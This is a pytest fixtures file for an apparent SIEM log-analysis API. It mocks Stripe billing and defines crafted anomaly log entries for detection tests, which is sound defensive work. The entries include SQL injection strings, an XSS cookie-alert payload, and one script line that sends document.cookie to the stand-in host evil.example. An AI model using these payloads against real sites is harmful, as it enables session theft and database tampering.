"""
tests/conftest.py — shared pytest fixtures for the Synthegria SIEM API test suite.

Design notes
────────────
* STRIPE_SECRET_KEY must be present before main.py is imported (it raises
  RuntimeError otherwise).  We inject a dummy key via os.environ.setdefault.
* Stripe is mocked with unittest.mock so no real API calls are made.
* The in-memory rate store is cleared before and after every test to keep
  tests independent.
* The TestClient uses the full app lifecycle (lifespan starts the asyncio
  background worker before the first request).
"""

from __future__ import annotations

import gzip
import json
import os
import time

# Must be set before importing main.py
os.environ.setdefault("STRIPE_SECRET_KEY", "sk_test_synthegria_pytest_dummy_key_00")

import pytest
from fastapi.testclient import TestClient
from unittest.mock import MagicMock, patch

import main as app_module
from main import app

# ---------------------------------------------------------------------------
# Public test constants
# ---------------------------------------------------------------------------

VALID_KEY  = "synthegria_test_key_1"
VALID_KEY2 = "synthegria_test_key_2"
BAD_KEY    = "totally_wrong_key_not_registered"
FAKE_METER_ID = "mtr_evt_pytest_000000000000"

# ---------------------------------------------------------------------------
# Stripe mock — autouse so no test ever calls real Stripe
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def mock_stripe():
    """Patch stripe.billing.MeterEvent.create to return a fake identifier."""
    fake_event = MagicMock()
    fake_event.identifier = FAKE_METER_ID
    with patch("main.stripe.billing.MeterEvent.create", return_value=fake_event):
        yield fake_event


# ---------------------------------------------------------------------------
# Rate-limit state — cleared before/after every test for isolation
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def reset_rate_store():
    app_module._rate_store.clear()
    yield
    app_module._rate_store.clear()


# ---------------------------------------------------------------------------
# TestClient  (starts full lifespan incl. background worker)
# ---------------------------------------------------------------------------

@pytest.fixture()
def client():
    with TestClient(app, raise_server_exceptions=True) as c:
        yield c


# ---------------------------------------------------------------------------
# Payload helpers (also importable directly in test modules)
# ---------------------------------------------------------------------------

def make_logs(n: int = 5) -> list[dict]:
    return [
        {
            "timestamp": "2026-01-01T00:00:00Z",
            "source_ip": f"1.2.3.{(i % 254) + 1}",
            "message":   "normal traffic observed",
            "severity":  "LOW",
        }
        for i in range(n)
    ]


def gz(data: list) -> bytes:
    return gzip.compress(json.dumps(data).encode())


def poll_job(client: TestClient, job_id: str, timeout: float = 12.0) -> dict:
    """Block until a bulk job reaches done/failed or times out."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        resp = client.get(f"/v1/jobs/{job_id}")
        body = resp.json()
        if body.get("status") in ("done", "failed"):
            return body
        time.sleep(0.15)
    return {}


# ---------------------------------------------------------------------------
# Crafted anomaly payloads
# ---------------------------------------------------------------------------

BRUTE_FORCE = {
    "timestamp": "2026-01-01T00:00:00Z",
    "source_ip": "198.51.100.1",
    "message":   "Failed password for root from 198.51.100.1 port 22 ssh2",
    "status":    "401",
}

SQL_INJECTION = {
    "timestamp": "2026-01-01T00:00:01Z",
    "source_ip": "203.0.113.1",
    "message":   "GET /q?id=1' UNION SELECT username,password FROM users--",
    "status":    "200",
}

XSS = {
    "timestamp": "2026-01-01T00:00:02Z",
    "source_ip": "192.0.2.1",
    "message":   "POST /c body=<script>alert(document.cookie)</script>",
    "status":    "200",
}

AUTH_ANOMALY = {
    "timestamp": "2026-01-01T00:00:03Z",
    "source_ip": "10.0.0.1",
    "message":   "Privilege escalation: sudo su root by user jenkins",
    "status":    "403",
}

MULTI_ANOMALY = {
    "timestamp": "2026-01-01T00:00:04Z",
    "source_ip": "198.18.0.1",
    "auth_msg":  "Failed password — account locked after too many attempts",
    "uri":       "/api?id=1;DROP TABLE users--",
    "referer":   "<script>document.location='https://evil.example/?c='+document.cookie</script>",
    "sudo_log":  "privilege escalation: unauthorized sudo to root",
}
